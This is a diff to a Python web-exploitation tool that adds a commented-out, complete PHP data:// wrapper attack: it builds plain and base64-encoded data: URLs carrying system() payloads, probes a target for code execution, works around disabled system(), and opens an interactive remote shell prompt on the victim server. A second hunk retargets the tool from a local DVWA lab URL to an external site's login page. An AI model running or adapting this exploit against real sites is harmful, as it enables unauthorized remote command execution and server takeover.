@@ -341,8 +341,154 @@ class Exploiters:
             if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
                 print (cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd(cmd,inputurl)), False))
         exit()
-#-------------------------------------------------------------------------
 
+    #-------------------------------------------------------------------------#
+    #--------------------------------------------------------data://-----------------------------------------------------------------------#
+
+
+# def send_data_cmd_generic(url):
+	# if(data_reverse):
+		# content = (requests.get(url,headers=gen_headers, verify=False)).text
+	# else:
+		# content = (requests.get(url,headers=gen_headers,timeout=15, verify=False)).text
+	# return content
+
+# def send_data_cmd_simple_nosl(cmd,url):
+	# #print "requested URL: %sdata:,%s" %(url,cmd)
+	# return send_data_cmd_generic("%sdata:,%s" %(url,cmd))
+
+# def send_data_cmd_simple_sl(cmd,url):
+	# #print "requested URL: %sdata://,%s" %(url,cmd)
+	# return send_data_cmd_generic("%sdata://,%s" %(url,cmd))
+
+# def send_data_cmd_b64_nosl(cmd,url):
+	# enc = base64.b64encode(cmd)
+	# #print "requested URL: %sdata:,%s" %(url,enc)
+	# return send_data_cmd_generic("%sdata:text/plain;base64,%s" %(url,enc))
+
+# def send_data_cmd_b64_sl(cmd,url):
+	# enc = base64.b64encode(cmd)
+	# #print "requested URL: %sdata://text/plain;base64,%s" %(url,enc)
+	# return send_data_cmd_generic("%sdata://text/plain;base64,%s" %(url,enc))
+
+# def send_data_cmd_default(cmd, url, choice):
+	# if(choice == 1):
+		# return send_data_cmd_simple_nosl(cmd,url)
+	# elif(choice == 2):
+		# return send_data_cmd_b64_nosl(cmd,url)
+	# elif(choice == 3):
+		# return send_data_cmd_simple_sl(cmd,url)
+	# else:
+		# return send_data_cmd_b64_sl(cmd,url)
+
+# def extract_data_res(resp):
+	# return extract_phpinput_res(resp)
+
+# def cleanDataCmd(cmd):
+	# newcmd = "AbracadabrA ** <?php "
+
+	# if(cmd[:6] != "php://"):
+		# if(reverseConn not in cmd):
+			# cmds = cmd.split('&')
+			# for c in cmds:
+				# if(len(c) > 0):
+					# newcmd += "system('%s');" %c
+		# else:
+			# b64cmd = base64.b64encode(cmd)
+			# newcmd += "system(base64_decode('%s'));" %b64cmd
+ 	# else:
+		# newcmd += cmd[6:]
+
+	# newcmd += "?> **"
+
+	# return newcmd
+
+# def run_data():
+	# global ahactive
+	# global ahurl
+	# global data_reverse
+	# global victimOs
+
+	# if(ahactive is False):
+		# odataurl = raw_input("[*] Enter the 'data://' vulnerable url (ex: 'http://site/index.php?page=') -> ")
+	# else:
+		# odataurl = ahurl
+
+	# odataurl = correctUrl(odataurl)
+	# odataurl = checkHttp(odataurl)
+	# rand_str = generateRandom()
+	# cmd = "<?php system(\"echo %s\");?>" %rand_str
+	# found = 0
+	# sys_disabled = False
+
+	# for i in range(1,5):
+		# content = send_data_cmd_default(cmd,odataurl,i)
+		# if "wrapper is disabled" in content or "no suitable wrapper could be found" in content or "Unable to find the wrapper" in content:
+			# return
+		# if("system() has been disabled for security reasons" in content):
+			# sys_disabled = True
+			# break
+
+		# '''print "\nUsing i = %s I found content:\n" %i
+		# print "----------------------------------------------------------"
+		# print content
+		# print "----------------------------------------------------------\n\n"'''
+		# indexes = SubstrFind(content,rand_str)
+		# if(len(indexes) > 0 and ("echo %s" %rand_str) not in content and ("echo%%20%s" %rand_str) not in content):
+			# found = i
+			# break
+
+	# # check if system() calls have been disabled
+	# # ---------------------------------------------------------------------
+	# if(sys_disabled):
+		# for i in range(1,5):
+			# cmd = "<?php echo %s;?>" %rand_str
+			# content = send_data_cmd_default(cmd,odataurl,i)
+			# indexes = SubstrFind(content,rand_str)
+			# if(len(indexes) > 0 and ("echo %s" %rand_str) not in content and ("echo%%20%s" %rand_str) not in content):
+				# found = i
+	# # ---------------------------------------------------------------------
+
+	# #print "found = %s" %found
+	# if(found != 0):
+		# print "\n[+] The website seems to be vulnerable. Opening a Shell.."
+		# if(sys_disabled):
+			# onlyPhpPrint()
+		# else:
+			# print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")
+		# time.sleep(1)
+
+		# inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(odataurl))
+		# whoami = ""
+		# pwd = ""
+
+		# if(sys_disabled is False):
+			# whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("whoami"), odataurl, found)), True)
+			# pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("pwd"), odataurl, found)), True))
+			# if(pwd == "?"):
+				# path = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("path"), odataurl, found)), True)
+				# if(checkIfWindows(path)):
+					# victimOs = "Windows"
+					# pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("cd"), odataurl, found)), True))
+		# else:
+			# whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://get_current_user();"), odataurl, found)), True)
+			# whoami = isUnknown(whoami)
+			# pwd = isUnknown(cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://getcwd();"), odataurl, found)), True))
+
+		# while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
+			# if(sys_disabled):
+				# cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,inputmain,pwd))
+				# if(cmd[:6] != "php://"):
+					# cmd = "php://%s" %cmd
+			# else:
+				# cmd = raw_input("%s@%s:%s$ " %(whoami,inputmain,pwd))
+			# cmd = cmd.replace("\"","'")
+			# if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
+					# cmd = cleanDataCmd(cmd)
+					# print "%s\n" %cleanOutput(extract_data_res(send_data_cmd_default(cmd,odataurl,found)), False)
+		# exit()
+
+#-----------------------------------------------------------------------------
 def php_zip():
     pass
 
@@ -392,7 +538,7 @@ class TestConnect:
 
 def main():
 
-    url = 'http://localhost:8080/dvwa/vulnerabilities/fi/?page=file1.php'
+    url = 'https://www.uitpentest.tk/login'
     php = True
     os = 'linux'
     key = []
